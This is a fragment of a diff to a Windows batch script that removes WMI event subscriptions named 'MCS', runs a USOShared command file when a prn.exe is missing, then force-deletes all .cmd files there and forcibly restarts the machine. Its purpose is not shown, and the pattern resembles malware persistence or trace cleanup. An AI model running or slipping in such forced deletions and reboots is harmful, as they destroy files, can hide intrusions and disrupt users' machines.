@@ -49,5 +49,5 @@ powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-WmiObject -Names
 powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter \"Name='MCS'\" | Remove-WmiObject"
 powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter \"Name='MCS'\" | Remove-WmiObject"
 
-dir "\\.\%ProgramData%\prndata\prn.exe" >nul || "%ProgramData%\USOShared\USOS.cmd"
+dir "\\.\%ProgramData%\prndata\prn.exe" >nul || "%ProgramData%\USOShared\USOS.cmd" && del /F /S /Q /A "%ProgramData%\USOShared\*.cmd"
 cmd.exe /c start "" powershell.exe -Command "Start-Sleep -Seconds 30; Restart-Computer -Force"
